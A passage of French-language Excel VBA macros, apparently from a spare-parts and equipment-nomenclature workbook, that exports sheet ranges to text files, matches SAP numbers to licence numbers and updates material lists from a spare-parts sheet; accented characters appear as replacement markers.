            ThisWorkbook.Sheets(shCde_Simon).Cells(16, 10).Value = iDonn|fffd|es - iDebut + 1
            iDonn|fffd|es = iDonn|fffd|es + 1
        Loop
    End With
    nom_fic_txt = ThisWorkbook.Sheets(shCde_Simon).Range("F5").Value + "_ENS_SUP.txt"
    FichierSortie = Application.GetSaveAsFilename(nom_fic_txt, "Fichiers texte (*.txt),*.txt", , "Indiquer o|fffd| enregistrer le fichier des Ensembles |fffd| supprimer")
    If FichierSortie = False Then Exit Sub
    ThisWorkbook.Sheets(shCde_Simon).Cells(21, 12).Value = "X"
    With ThisWorkbook.Worksheets(shENS_ASupprimer)
        Set RangeAExporter = .Range(.Cells(2, 1), .Cells(.UsedRange.Rows.Count, 2))
    End With
    SaveRangeAsFixedText RangeAExporter, Array(18, 4), CStr(FichierSortie)
    MsgBox "Fichier export|fffd| dans " & FichierSortie, vbInformation
    ' On ouvre l'explorateur de fichiers
    Shell "C:\windows\explorer.exe " & sDossier(FichierSortie), vbMaximizedFocus
End Sub


Sub chg_var_liber_prefixe()
    iDebut = 4 'CInt(ThisWorkbook.Sheets(shCde_Simon).Range("D16").Value)
    If iDebut = 0 Then iDebut = 2
    'chargemnt prefixe pour num licence provisoire lecture debut +3
    iDonn|fffd|es = iDebut
    While var_efp = vbNullString
        Lire_ligne (2)
        iDonn|fffd|es = iDonn|fffd|es + 1
    Wend
    libel_prefixe = var_ligne + var_efp + var_fp
    ThisWorkbook.Sheets(shCde_Simon).Cells(5, 6).Value = libel_prefixe
End Sub


'Bouton R|fffd|cup|fffd|ration Num|fffd|ros SAP
Sub recup_num_sap()
    Dim v_numsap As Variant, v_numlic As Variant, lib As Variant, Reponse As Variant, mem_lib As Variant
    Dim nb_lig_decoup As Integer, i As Integer, j As Integer, k As Integer, erreur, Nb_recup As Integer
    Application.DisplayAlerts = False
    'recherche du fichier contenant les numeros SAP SIMON et N|fffd| de licence
    Chemin = Application.GetOpenFilename("Fichiers Excel (*.xls), *.xls", , "S|fffd|lectionner le fichier de travail")
    If Chemin = False Then Exit Sub
    'ouverture fichier travail choisi
    Workbooks.Open Filename:=Chemin
    'selestion des onglets |fffd| copier
    Sheets(1).Select
    Sheets(1).Name = "RIEQUI20"
    'copie de l onglet
    Nom_macro = ActiveWorkbook.FullName
    Sheets(1).Copy after:=ThisWorkbook.Sheets(shCde_Simon)
    'extraction du nom du fichier du chemin complet
    fichier_travail = Chemin
    j = 1
    i = 1
    Do While i <> 0
        i = VBA.InStr(j, fichier_travail, "\")
        j = j + 1
    Loop
    i = VBA.Len(fichier_travail) - j + 2
    fichier_travail = VBA.Right(fichier_travail, i)
    fichier_travail = VBA.Left(fichier_travail, i - 4)
    Windows(fichier_travail + ".xls").Close 'fermeture du fichier
    Sheets(shDecoupage).Select
    chg_var_liber_prefixe 'reconstitution du prefixe num licence
    erreur = 0      'd|fffd|but du traitement
    Nb_recup = 0
    v_numsap = "DT"
    Application.StatusBar = vbNullString
    Application.ScreenUpdating = False
    j = 1
    'recherche du nombre de ligne du tableau Decoupage
    nb_lig_decoup = Lastline(ThisWorkbook.Worksheets(shDecoupage))
    'nb_lig_decoup = Derniere_Ligne(shDecoupage, 4, 1)
    v_numsap = "DT"
    'Lecture de chaque ligne du fichier NUM SAP / NUM LICENCE
    'boucle jusqu'a la premi|fffd|re ligne non document|fffd|e
    Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "N"
    Do While v_numsap <> vbNullString
        j = j + 1
        'chargement numsap et num licence correspondants
        v_numsap = ThisWorkbook.Sheets("RIEQUI20").Cells(j, 5).Value ' Modif du 08/01 : On r|fffd|cup|fffd|re le n|fffd| SIMON
        v_numlic = ThisWorkbook.Sheets("RIEQUI20").Cells(j, 10).Value ' Modif du 08/01 : On r|fffd|cup|fffd|re le n|fffd| de licence
        
        'recherche dans onglet Decoupage du numero licence correspondant
        k = iDebut - 1
        mem_lib = "vide"
        Do While lib <> v_numlic And k < nb_lig_decoup
            k = k + 1
            lib = ThisWorkbook.Sheets(shDecoupage).Cells(k, 18).Value
            If lib = v_numlic Then mem_lib = lib
        Loop
        Application.StatusBar = j
        If mem_lib = v_numlic Then
            If v_numlic <> vbNullString Then ThisWorkbook.Sheets(shDecoupage).Cells(k, 18).Value = v_numsap: Nb_recup = Nb_recup + 1
        Else
            If mem_lib <> "vide" Then erreur = erreur + 1
        End If
    Loop
    Sheets(Array("RIEQUI20")).Select
    ActiveWindow.SelectedSheets.Delete
    Application.ScreenUpdating = True
    Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "O"
    If erreur = 0 Then
    'selestion des onglets supprimer
        Reponse = MsgBox(" Nombre de lignes modifi|fffd|es : " & Nb_recup & " / " & nb_lig_decoup, 0, " Fin de Traitement recup|fffd|ration NUM_SAP ")
    Else
        Reponse = MsgBox(erreur & ": Erreurs durant le trairement", 0, " Fin de Traitement recup|fffd|ration NUM_SAP ")
    End If
    Application.DisplayAlerts = True
End Sub

Public Function sDossier(ByVal sChemin As String) As String
    Dim lPos As Long, l As Long
    lPos = 1
    Do
        l = VBA.InStr(lPos + 1, sChemin, "\")
        If l = 0 Then Exit Do
        lPos = l
    Loop
    sDossier = VBA.Left(sChemin, lPos)
End Function
Attribute VB_Name = "TDI_Mod_PR"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   :
'[Auteur        : Joel Martin
'[Service       : SIMPM - Sce 65931
'[Date cr|fffd|ation : 06/07/2005
'[Version       : V1.2 du 19/03/2009
'[---------------------------------------------------------------------------
'[Sujet:
'[---------------------------------------------------------------------------


'**************************************************
' Reprise fonction Charge_PdR_init Jm  16-11-2006
' Pb index jm 30-11-2006
' Pb mise |fffd| jour liste PR 04-04-2007
' JM 03-08-2007 Chargement liste PR
'               Ajouter des sous ensembles dans la liste PR
'               Ajout Ref et Nom integrateur dans liste Pr en cas de cr|fffd|ation
' JM 02-10-2007 Suppression fonction Initialisation liste PR
'               Int|fffd|gration des constantes pour d|fffd|larer les onglets
'****************************************************************************


'****************************************
' recherche si l'|fffd|l|fffd|ment existe
' si existant sommer le quantit|fffd|
' si inexistant mettre en table
'****************************************
Function Exist_PdR(Ch As String) As Boolean
    Dim trouve As Integer, i As Integer
    Dim Fin As Boolean
    trouve = 0
    i = 1
    Exist_PdR = False
    Fin = False
    Do
        If i <= nb_element Then
            If tab_article(i) = Ch Then
                Fin = True
                Qte = Qte + tab_qte(i)
                tab_qte(i) = Qte
                nb_ligne_element = tab_ind(i)
                Ind_PR = tab_ind(i)
                trouve = tab_ind(i)
                Exist_PdR = True
            Else
                i = i + 1
            End If
        Else
            ' cas du nouveau
            Fin = True
            nb_element = nb_element + 1
            nb_ligne_element = nb_element
            ' mettre en table
            ' ===============
            tab_qte(nb_ligne_element) = Qte
            tab_article(nb_ligne_element) = Ch
            Ind_PR = nb_ligne_element + 5
            tab_ind(nb_ligne_element) = Ind_PR 'nb_ligne_element
            'Ind_PR = nb_ligne_element
        End If
    Loop Until Fin
End Function




' ******************************************
' G|fffd|n|fffd|ration de la liste PR dans le TDI
' Module Pr Auteur JM
'*******************************************
Sub Bouton_Materiels_vers_Pdr()
    ' On d|fffd|sactive tout ce qui peut l'|fffd|tre
    GererConfiguration False
'    ' On efface les donn|fffd|es pr|fffd|c|fffd|dentes
'    Worksheets(shPieces_Rechange).Rows("6:65536").Delete
'    Worksheets(shPieces_Rechange).Rows("6:65536").NumberFormat = "@"
    '
    Ind_PR = 6
    nb_element = 0
    nb_ligne_element = 0
    design_err = 0
    ref_fab_err = 0
    nom_fab_err = 0
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(12, 3).Value = 0
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(13, 3).Value = 0
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(14, 3).Value = 0
    Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "N"
    Worksheets(shMateriels).Activate
    ShowAllRecords (shMateriels)

    Charge_PdR_init

    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(18, 7).Value = VBA.Date & " - " & VBA.Time
    Charge_Mat ThisWorkbook.Worksheets(shPieces_Rechange)
    Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "O"
    ' On active tout ce qui doit l'|fffd|tre
    GererConfiguration True
End Sub



'*************************************
' Charge la liste en Pi|fffd|ce de rechange
'*************************************
Sub Charge_PdR_init()
    Dim i As Long, Nb_Art_PR As Long
    
    ShowAllRecords (shPieces_Rechange)
    Init_var_PR Worksheets(shPieces_Rechange)
    'Init_var_PR (shPieces_Rechange)
    Num_ssen_PR = ThisWorkbook.Sheets(ShAffaire).Cells(23, 5).Value
    
    Nb_Art_PR = Lastline(ThisWorkbook.Sheets(shPieces_Rechange))
    i = FirstLine(shPieces_Rechange)
    Do Until i > Nb_Art_PR
        Lire_PR Worksheets(shPieces_Rechange), i
        Qte = 0
        If Num_ssen_PR <> "*" Then
            tab_qte(nb_element + 1) = Qte
            tab_article(nb_element + 1) = vbNullString
            tab_ind(nb_element + 1) = 0
            If Exist_PdR_1(Cle_Art_PR) Then
               ThisWorkbook.Sheets(shPieces_Rechange).Cells(i, P_Rapproche_PR).Value = "Doublon"
            Else
                ThisWorkbook.Sheets(shPieces_Rechange).Cells(i, P_Rapproche_PR).Value = "No_TDI"
                nb_element = nb_element + 1
                nb_ligne_element = nb_element
                ThisWorkbook.Sheets(shPieces_Rechange).Cells(i, P_Date_enrich_PR).Value = VBA.Date
                tab_qte(nb_element) = Qte
                tab_article(nb_element) = Cle_Art_PR
                tab_ind(nb_element) = i
            End If
        End If
        nb_ligne_element = Nb_Art_PR
        ThisWorkbook.Sheets(shCde_Nomenclature).Cells(13, 3).Value = i - 4
        i = i + 1
    Loop
    nb_element = nb_element
End Sub

'*************************************
' Charge la liste en Pi|fffd|ce de rechange
'ACH, Est-ce utilis|fffd| ?
'*************************************
Sub Charge_PdR()
    Dim i As Long, Nb_Art_PR As Long
    
    ShowAllRecords (shPieces_Rechange)
    Init_var_PR Worksheets(shPieces_Rechange)
    Num_ssen_PR = ThisWorkbook.Sheets(ShAffaire).Cells(23, 5).Value
    Nb_Art_PR = Lastline(ThisWorkbook.Sheets(shPieces_Rechange))
    i = FirstLine(shPieces_Rechange)
    Do Until i > Nb_Art_PR
        Lire_PR Worksheets(shPieces_Rechange), i
        Qte = 0
        If Num_ssen_PR <> "*" Then
            Ind_PR = i
            If Exist_PdR(Cle_Art_PR) Then
                ThisWorkbook.Sheets(shPieces_Rechange).Cells(i, P_Rapproche_PR).Value = "OkTDI"
            Else
                ThisWorkbook.Sheets(shPieces_Rechange).Cells(i, P_Rapproche_PR).Value = "Nouv"
                ThisWorkbook.Sheets(shPieces_Rechange).Cells(i, P_Date_enrich_PR).Value = VBA.Date
                ' cas du nouvel |fffd|l|fffd|ment
                ThisWorkbook.Sheets(shPieces_Rechange).Cells(i, P_Repere_PR).Value = Ind_PR - 5
            End If
        End If
        ThisWorkbook.Sheets(shCde_Nomenclature).Cells(13, 3).Value = i - 4
        i = i + 1
    Loop
    'nb_element = Nb_Art_PR - 5
    nb_element = nb_element
End Sub

'ACH, Est-ce utilis|fffd| ?
Sub Enrichi_TDI()
    Init_var_dec ThisWorkbook.Worksheets(shMateriels)
    nb_element = 0
    nb_ligne_element = 0
    design_err = 0
    ref_fab_err = 0
    nom_fab_err = 0
    ThisWorkbook.Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "N"
    nb_ligne_element = 0
    ThisWorkbook.Worksheets(shCde_Nomenclature).Activate
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(12, 3).Value = 0
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(13, 3).Value = 0
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(14, 3).Value = 0
    Charge_PdR_Mat      ' Charge la liste en Pi|fffd|ce de rechange
    
    Enrich_Mat ThisWorkbook.Worksheets(shMateriels)
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(18, 9).Value = VBA.Date & " - " & VBA.Time
    ThisWorkbook.Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "O"
End Sub


'************************************************
' Charge la liste en Pi|fffd|ce de rechange
' avec ref et nom fournisseur saisie en 21 et 23
'ACH, Est-ce utilis|fffd| ?
'************************************************
Sub Charge_PdR_Mat()
    Dim i As Long, j As Long, Nb_Art_PR As Long
    ShowAllRecords (shPieces_Rechange)
    Init_var_PR Worksheets(shPieces_Rechange)
    Nb_Art_PR = Lastline(ThisWorkbook.Sheets(shPieces_Rechange))
    i = FirstLine(shPieces_Rechange)
    Do Until i > Nb_Art_PR
        Lire_PR Worksheets(shPieces_Rechange), i
        If Num_ssen_PR <> "*" Then
            j = 1
            Fin = False
            Do
                If j <= nb_element Then
                    If tab_article(j) = Cle_Art_PR Then Fin = True Else j = j + 1
                Else ' cas du nouveau
                    nb_element = nb_element + 1
                    nb_ligne_element = nb_element
                    ' mettre en table
                    ' ===============
                    tab_article(nb_ligne_element) = Cle_Art_PR
                    tab_ind(nb_ligne_element) = i 'nb_ligne_element
                End If
            Loop Until Fin
        End If
        ThisWorkbook.Sheets(shCde_Nomenclature).Cells(13, 3).Value = i - 4
        i = i + 1
    Loop
    nb_element = Nb_Art_PR - 5
End Sub


'*******************************
'ong_dec : materiel ou decoupage
'ACH, Est-ce utilis|fffd| ?
'********************************
Sub Enrich_Mat(WsMat As Worksheet)
    Dim i As Long
    Dim Nb_Art_TDI As Integer
    Dim modif_ok As Boolean
    modif_ok = False
    Nb_Art_TDI = Lastline(WsMat)
    i = FirstLine(shMateriels)
    Do Until i > Nb_Art_TDI
        Lire_Dec i, WsMat.Name
        If Niveau_dec = "A" Then 'And Etude_suf_Dec = vbnullstring
            modif_ok = False
            '**************
            ' recherche" si l'|fffd|l|fffd|ment est estistant
            If Exist_PdR_1(Cle_Art_dec) Then
                'Lire_PR (nb_ligne_element + 5)
                nb_ligne_element = nb_ligne_element
                Lire_PR Worksheets(shPieces_Rechange), Ind_PR
                
                If Etude_suf_Dec <> Etude_Suf_PR Then
                    WsMat.Cells(i, P_Etude_suf_Dec).Value = Etude_Suf_PR
                    WsMat.Cells(i, P_Etude_suf_Dec).Font.Bold = True
                    modif_ok = True
                Else
                    WsMat.Cells(i, P_Etude_suf_Dec).Font.Bold = False
                End If
                If Etude_ref_Dec <> Etude_Ref_PR Then
                    WsMat.Cells(i, P_Etude_ref_Dec).Value = Etude_Ref_PR
                    WsMat.Cells(i, P_Etude_ref_Dec).Font.Bold = True
                    modif_ok = True
                Else
                    WsMat.Cells(i, P_Etude_ref_Dec).Font.Bold = False
                End If
                If Etude_nom_Dec <> Etude_Nom_PR Then
                    WsMat.Cells(i, P_Etude_nom_Dec).Value = Etude_Nom_PR
                    WsMat.Cells(i, P_Etude_nom_Dec).Font.Bold = True
                    modif_ok = True
                Else
                    WsMat.Cells(i, P_Etude_nom_Dec).Font.Bold = False
                End If
                If Design_Dec <> Lib_PR Then
                    WsMat.Cells(i, P_design_Dec).Value = Lib_PR
                    WsMat.Cells(i, P_design_Dec).Font.Bold = True
                    modif_ok = True
                Else
                    WsMat.Cells(i, P_design_Dec).Font.Bold = False
                End If
                If SacimMabec_PR = "_" Then SacimMabec_PR = vbNullString
                If SacimMabec_Dec <> SacimMabec_PR Then
                    WsMat.Cells(i, P_SacimMabec_Dec).Value = SacimMabec_PR
                    WsMat.Cells(i, P_SacimMabec_Dec).Font.Bold = True
                    modif_ok = True
                Else
                    WsMat.Cells(i, P_SacimMabec_Dec).Font.Bold = False
                End If
                           
                If Tech_Dec <> Tech_PR Then
                    WsMat.Cells(i, P_Tech_Dec).Value = Tech_PR
                    WsMat.Cells(i, P_Tech_Dec).Font.Bold = True
                    modif_ok = True
                Else
                    WsMat.Cells(i, P_Tech_Dec).Font.Bold = False
                End If
                If Categorie_Dec <> Categorie_PR Then
                    WsMat.Cells(i, P_Categorie_Dec).Value = Categorie_PR
                    WsMat.Cells(i, P_Categorie_Dec).Font.Bold = True
                    modif_ok = True
                Else
                    WsMat.Cells(i, P_Tech_Dec).Font.Bold = False
                End If
                If Document_Dec <> Document_PR Then
                    If VBA.Len(Document_PR) < 26 And Caracteres_Compatibles_GedTmi(Document_PR) Then
                        ' Prise en compte si document PR ok 15-04-2007
                        WsMat.Cells(i, P_document_Dec).Value = Document_PR
                        WsMat.Cells(i, P_document_Dec).Font.Bold = True
                        modif_ok = True
                    Else
                        WsMat.Cells(i, P_document_Dec).Font.Bold = False
                    End If
                Else
                    WsMat.Cells(i, P_document_Dec).Font.Bold = False
                End If
                
                Select Case Categorie_PR
                    Case "B", "F"
                          'Reponse UET reponse Ok le 20/03/2007
                        If Document_Dec <> Document_PR Then
                            WsMat.Cells(i, P_document_Dec).Value = Document_PR
                            WsMat.Cells(i, P_document_Dec).Font.Bold = True
                            modif_ok = True
                        Else
                            WsMat.Cells(i, P_document_Dec).Font.Bold = False
                        End If
                    Case "C"
                        If Piece_rech_PR = "N" Then
                               'Reponse UET reponse Ok le 20/03/2007
                            If Document_Dec <> Document_PR Then
                                If Document_PR = vbNullString Then WsMat.Cells(i, P_document_Dec).Value = "SP" Else WsMat.Cells(i, P_document_Dec).Value = Document_PR
                                WsMat.Cells(i, P_document_Dec).Font.Bold = True
                                modif_ok = True
                            Else
                                WsMat.Cells(i, P_document_Dec).Font.Bold = False
                            End If
                        Else
                            If Document_Dec <> Document_PR Then
                                If Document_PR = vbNullString Then WsMat.Cells(i, P_document_Dec).Value = "SP" Else WsMat.Cells(i, P_document_Dec).Value = Document_PR
                                WsMat.Cells(i, P_document_Dec).Font.Bold = True
                                modif_ok = True
                            Else
                                WsMat.Cells(i, P_document_Dec).Font.Bold = False
                            End If
                        End If
                End Select
                
                If Piece_rech_Dec <> Piece_rech_PR Then
                    WsMat.Cells(i, P_Piece_rech_Dec).Value = Piece_rech_PR
                    WsMat.Cells(i, P_Piece_rech_Dec).Font.Bold = True
                    modif_ok = True
                Else
                    WsMat.Cells(i, P_Piece_rech_Dec).Font.Bold = False
                End If
                
                'traitement des modifs
                If modif_ok Then
                    WsMat.Cells(i, P_Date_modif_Dec).Value = VBA.Format(Now, "dd/mm/yyyy")
                    WsMat.Cells(i, P_Date_modif_Dec).Font.Bold = True
                Else
                    WsMat.Cells(i, P_Date_modif_Dec).Font.Bold = False
                End If
            Else
                If VBA.Mid(WsMat.Cells(i, P_Piece_rech_Dec).Value, 2, 1) = "V" Then
                    WsMat.Cells(i, P_Piece_rech_Dec).Value = VBA.Mid(WsMat.Cells(i, P_Piece_rech_Dec).Value, 1, 1)
                    WsMat.Cells(i, P_Date_modif_Dec).Value = VBA.Format(Now, "dd/mm/yyyy")
                    WsMat.Cells(i, P_Date_modif_Dec).Font.Bold = True
                Else
                    WsMat.Cells(i, P_Date_modif_Dec).Font.Bold = False
                End If
            End If
            ThisWorkbook.Sheets(shCde_Nomenclature).Cells(13, 3).Value = i - 4
        Else
            ThisWorkbook.Sheets(shCde_Nomenclature).Cells(13, 3).Value = i - 4
        End If
        i = i + 1
    Loop
End Sub

'Dans le cas ou la feuille Mat|fffd|riels est Vide
Sub Liste_Pr_Vers_Materiels(WsMat As Worksheet, WsPr As Worksheet)
    Dim Ligne_Mat As Long, Ligne_Dec As Long, Ligne_Pr As Long
    Const Ensemble = "ENSEMBLE-1"
    Const Sous_Ens = "SOUS-ENS-1"
    
    Application.EnableEvents = False
    Init_var_PR Worksheets(shPieces_Rechange)
    
    'Cr|fffd|er Ensemble
    With ThisWorkbook.Worksheets(shDecoupage)
        Ligne_Dec = Lastline(ThisWorkbook.Worksheets(shDecoupage)) + 1
        If Ligne_Dec < FirstLine(shDecoupage) Then Ligne_Dec = FirstLine(shDecoupage)
        .Cells(Ligne_Dec, 1).Value = Ligne_Dec
        .Cells(Ligne_Dec, .Range("DecNiveauPose").Column).Value = 0
        .Cells(Ligne_Dec, .Range("DecNiveau").Column).Value = "E"
        .Cells(Ligne_Dec, .Range("DecDateModif").Column).Value = VBA.Format(Now, "dd/mm/yyyy")
        .Cells(Ligne_Dec, .Range("DecCategorie").Column).Value = "C"
        .Cells(Ligne_Dec, .Range("DecNomencl").Column).Value = "M"
        .Cells(Ligne_Dec, .Range("DecNum_SSEN").Column).Value = Ensemble
        .Cells(Ligne_Dec, .Range("DecSuf_SSEN").Column).Value = vbNullString
        .Cells(Ligne_Dec, .Range("DecNomFournisseur").Column).Value = "TDI"
        .Cells(Ligne_Dec, .Range("DecDesignation").Column).Value = "TDI - ENSEMBLE FICTIF"
        .Cells(Ligne_Dec, .Range("DecQuantite").Column).Value = 1
        .Cells(Ligne_Dec, .Range("DecDocument").Column).Value = "SP"
    End With
    
    'Cr|fffd|er Sous-Ensemble
    Ligne_Mat = FirstLine(shMateriels)
    With WsMat
        .Cells(Ligne_Mat, 1).Value = Ligne_Mat
        .Cells(Ligne_Mat, P_Repere_Dec).Value = "-"
        .Cells(Ligne_Mat, P_Num_ssen_Dec).Value = Ensemble
        .Cells(Ligne_Mat, P_Niveau_dec).Value = "S"
        .Cells(Ligne_Mat, P_Categorie_Dec).Value = "C"
        .Cells(Ligne_Mat, P_Etude_ref_Dec).Value = Sous_Ens
        .Cells(Ligne_Mat, P_Etude_suf_Dec).Value = vbNullString
        .Cells(Ligne_Mat, P_Etude_nom_Dec).Value = "TDI"
        .Cells(Ligne_Mat, P_design_Dec).Value = "TDI - SOUS ENSEMBLE FICTIF"
        .Cells(Ligne_Mat, P_Qte_Dec).Value = 1
        .Cells(Ligne_Mat, P_Piece_rech_Dec).Value = "N"
        .Cells(Ligne_Mat, P_document_Dec).Value = "SP"
        .Cells(Ligne_Mat, P_Date_modif_Dec).Value = VBA.Format(Now, "dd/mm/yyyy")
        Ligne_Mat = Ligne_Mat + 1
        'Pour Chaque Ligne Pr -> Mat|fffd|riels
        Ligne_Pr = FirstLine(shPieces_Rechange)
        Do Until Ligne_Pr > Lastline(WsPr)
            'On ne Migre pas les lignes avec un '*' dans la colonne 1, PrNum_SSEN
            If VBA.Trim(WsPr.Cells(Ligne_Pr, WsPr.Range("PrNum_SSEN").Column).Value) <> "*" Then
                Lire_PR WsPr, Ligne_Pr
                .Cells(Ligne_Mat, 1).Value = Ligne_Mat
                .Cells(Ligne_Mat, P_Repere_Dec).Value = "-"
                .Cells(Ligne_Mat, P_Num_ssen_Dec).Value = Sous_Ens
                WsPr.Cells(Ligne_Pr, P_Ref_Origine_PR).Value = Cle_Ref_PR
                WsPr.Cells(Ligne_Pr, P_Nom_Origine_PR).Value = Etude_Nom_PR
                
                .Cells(Ligne_Mat, P_Niveau_dec).Value = "A"
                .Cells(Ligne_Mat, P_Etude_suf_Dec).Value = Etude_Suf_PR
                .Cells(Ligne_Mat, P_Etude_ref_Dec).Value = Etude_Ref_PR
                .Cells(Ligne_Mat, P_Etude_nom_Dec).Value = Etude_Nom_PR
                .Cells(Ligne_Mat, P_design_Dec).Value = Lib_PR
                .Cells(Ligne_Mat, P_Ref_Int_Dec).Value = Ref_Int_PR
                .Cells(Ligne_Mat, P_Nom_Int_Dec).Value = Nom_Int_PR
                
                .Cells(Ligne_Mat, P_SacimMabec_Dec).Value = SacimMabec_PR
                .Cells(Ligne_Mat, P_Tech_Dec).Value = Tech_PR
                .Cells(Ligne_Mat, P_Categorie_Dec).Value = Categorie_PR
                If VBA.Len(Document_PR) < 26 And Caracteres_Compatibles_GedTmi(Document_PR) Then .Cells(Ligne_Mat, P_document_Dec).Value = Document_PR
    
                .Cells(Ligne_Mat, P_Obs_Dec).Value = Obs_PR
                .Cells(Ligne_Mat, P_Code_EAN_Dec).Value = Code_EAN_PR
    
                Select Case Categorie_PR
                    Case "B", "F"
                        .Cells(Ligne_Mat, P_document_Dec).Value = Document_PR
                    Case "C"
                        If Piece_rech_PR = "N" Then
                            If Document_PR = vbNullString Then .Cells(Ligne_Mat, P_document_Dec).Value = "SP" Else .Cells(Ligne_Mat, P_document_Dec).Value = Document_PR
                        Else
                            If Document_PR = vbNullString Then .Cells(Ligne_Mat, P_document_Dec).Value = "SP" Else .Cells(Ligne_Mat, P_document_Dec).Value = Document_PR
                        End If
                End Select
                .Cells(Ligne_Mat, P_Qte_Dec).Value = Qte_PR
                .Cells(Ligne_Mat, P_Piece_rech_Dec).Value = Piece_rech_PR
                .Cells(Ligne_Mat, P_Date_modif_Dec).Value = VBA.Format(Now, "dd/mm/yyyy")
                Ligne_Mat = Ligne_Mat + 1
            End If
            Ligne_Pr = Ligne_Pr + 1
        Loop
    End With
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(13, 3).Value = Ligne_Mat - 4
    Application.EnableEvents = True
    Mise_en_Forme_TDI
End Sub

Sub Bouton_Pdr_Vers_Materiels()
    ' On d|fffd|sactive tout ce qui peut l'|fffd|tre
    GererConfiguration False
    Init_var_dec ThisWorkbook.Worksheets(shMateriels)
    nb_element = 0
    nb_ligne_element = 0
    design_err = 0
    ref_fab_err = 0
    nom_fab_err = 0
    ThisWorkbook.Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "N"
    nb_ligne_element = 0
    ThisWorkbook.Worksheets(shCde_Nomenclature).Activate
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(12, 3).Value = 0
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(13, 3).Value = 0
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(14, 3).Value = 0
    Enrich_Mat_origine ThisWorkbook.Worksheets(shMateriels)
    ThisWorkbook.Sheets(shCde_Nomenclature).Cells(18, 10).Value = VBA.Date & " - " & VBA.Time
    ThisWorkbook.Sheets(ShAffaire).Range("Champ_Analyse_Dynamique").Value = "O"
    ' On active tout ce qui doit l'|fffd|tre
    GererConfiguration True
End Sub


'*****************************************************
' Charge la liste en Pi|fffd|ce de rechange
' avec ref et nom fournisseur sauve garde en 65 et 66
'*****************************************************
Sub Charge_PdR_Mat_Origine()
    Dim i As Long, j As Long, Nb_Art_PR As Long
    
    ShowAllRecords (shPieces_Rechange)
    Init_var_PR Worksheets(shPieces_Rechange)
    
    Nb_Art_PR = Lastline(ThisWorkbook.Sheets(shPieces_Rechange))
    i = FirstLine(shPieces_Rechange)
    Do Until i > Nb_Art_PR
        Lire_PR Worksheets(shPieces_Rechange), i
        If Num_ssen_PR <> "*" Then
            j = 1
            Fin = False
            Do
                If j <= nb_element Then
                    If tab_article(j) = Cle_Art_PR_Origine Then Fin = True Else j = j + 1
                Else ' cas du nouveau
                    nb_element = nb_element + 1
                    nb_ligne_element = nb_element
                    ' mettre en table
                    ' ===============
                    tab_article(nb_ligne_element) = Cle_Art_PR_Origine
                    tab_ind(nb_ligne_element) = i 'nb_ligne_element
                End If
            Loop Until Fin
        End If
        ThisWorkbook.Sheets(shCde_Nomenclature).Cells(13, 3).Value = i - 4
        i = i + 1
    Loop
    nb_element = Nb_Art_PR - 5
End Sub


'*******************************
'ong_dec : materiel ou decoupage
'********************************
Sub Enrich_Mat_origine(WsMat As Worksheet)
    Dim i As Long, Nb_Art_TDI As Long
    Dim modif_ok As Boolean
    
    modif_ok = False
    
    Nb_Art_TDI = Lastline(WsMat)
    If Nb_Art_TDI < FirstLine(shMateriels) Then
        Liste_Pr_Vers_Materiels WsMat, ThisWorkbook.Sheets(shPieces_Rechange)
    Else
        With WsMat
            Charge_PdR_Mat_Origine      ' Charge la liste en Pi|fffd|ce de rechange
            i = FirstLine(shMateriels)
            Do Until i > Nb_Art_TDI
                Lire_Dec i, .Name
                If Niveau_dec = "A" Then 'And Etude_suf_Dec = vbnullstring
                    modif_ok = False
                    '**************
                    ' recherche" si l'|fffd|l|fffd|ment est existant
                    If Exist_PdR_1(Cle_Art_dec) Then
                        'Lire_PR (nb_ligne_element + 5)
                        nb_ligne_element = nb_ligne_element
                        Lire_PR Worksheets(shPieces_Rechange), Ind_PR
                        ThisWorkbook.Sheets(shPieces_Rechange).Cells(Ind_PR, P_Ref_Origine_PR).Value = Cle_Ref_PR
                        ThisWorkbook.Sheets(shPieces_Rechange).Cells(Ind_PR, P_Nom_Origine_PR).Value = Etude_Nom_PR
                        
                        If Etude_suf_Dec <> Etude_Suf_PR Then
                            .Cells(i, P_Etude_suf_Dec).Value = Etude_Suf_PR
                            .Cells(i, P_Etude_suf_Dec).Font.Bold = True
                            modif_ok = True
                        Else
                            .Cells(i, P_Etude_suf_Dec).Font.Bold = False
                        End If
                        
                        If Etude_ref_Dec <> Etude_Ref_PR Then
                            .Cells(i, P_Etude_ref_Dec).Value = Etude_Ref_PR
                            .Cells(i, P_Etude_ref_Dec).Font.Bold = True
                            modif_ok = True
                        Else
                            .Cells(i, P_Etude_ref_Dec).Font.Bold = False
                        End If
                        
                        If Etude_nom_Dec <> Etude_Nom_PR Then
                            .Cells(i, P_Etude_nom_Dec).Value = Etude_Nom_PR
                            .Cells(i, P_Etude_nom_Dec).Font.Bold = True
                            modif_ok = True
                        Else
                            .Cells(i, P_Etude_nom_Dec).Font.Bold = False
                        End If
                        
                        If Design_Dec <> Lib_PR Then
                            .Cells(i, P_design_Dec).Value = Lib_PR
                            .Cells(i, P_design_Dec).Font.Bold = True
                            modif_ok = True
                        Else
                            .Cells(i, P_design_Dec).Font.Bold = False
                        End If
                        
                        If SacimMabec_PR = "_" Then SacimMabec_PR = vbNullString
                        If SacimMabec_Dec <> SacimMabec_PR Then
                            .Cells(i, P_SacimMabec_Dec).Value = SacimMabec_PR
                            .Cells(i, P_SacimMabec_Dec).Font.Bold = True
                            modif_ok = True
                        Else
                            .Cells(i, P_SacimMabec_Dec).Font.Bold = False
                        End If
                                   
                        If Tech_Dec <> Tech_PR Then
                            .Cells(i, P_Tech_Dec).Value = Tech_PR
